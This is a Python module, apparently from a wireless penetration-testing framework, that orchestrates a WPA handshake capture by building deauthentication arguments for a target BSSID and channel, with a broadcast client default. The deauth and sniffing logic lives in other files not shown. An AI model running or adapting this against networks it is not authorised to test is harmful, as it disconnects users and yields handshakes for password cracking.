import argparse

from pathlib2 import Path
from pony.orm import *

from pinecone.core.database import BasicServiceSet
from pinecone.core.script import BaseScript
from pinecone.utils.template import to_args_str


class Module(BaseScript):
    META = {
        "id": "scripts/attack/wpa_handshake",
        "name": "WPA handshake capture script",
        "author": "Valentín Blanco (https://github.com/valenbg1/)",
        "version": "1.0.0",
        "description": "Capture WPA handshakes by deauthenticating stations and then sniffing for the handshake.",
        "options": argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter),
        "depends": {"attack/deauth"}
    }
    META["options"].add_argument("-i", "--iface", help="Monitor mode capable WLAN interface.", default="wlan0", type=str)
    META["options"].add_argument("-b", "--bssid", type=str)
    META["options"].add_argument("-s", "--ssid", type=str)
    META["options"].add_argument("-c", "--client", default="FF:FF:FF:FF:FF:FF", type=str)

    START_SCRIPT_TEMPLATE_PATH = Path(Path(__file__).parent, "start_wpa_handshake_template").resolve()  # type: Path
    START_SCRIPT_FILENAME = "start_wpa_handshake_script"

    def __init__(self):
        super().__init__()

    @db_session
    def run(self, args, cmd):
        try:
            bss = BasicServiceSet[args.bssid]
        except:
            cmd.perror("No BSS with BSSID: {}".format(args.bssid))
            return

        script_args = argparse.Namespace()
        script_args.deauth_args = to_args_str({
            "iface": args.iface,
            "bssid": bss.bssid,
            "channel": bss.channel,
            "client": args.client
            #"num-packets": args.num_packets
        })
        super().run(script_args, cmd)

    def stop(self, cmd):
        pass
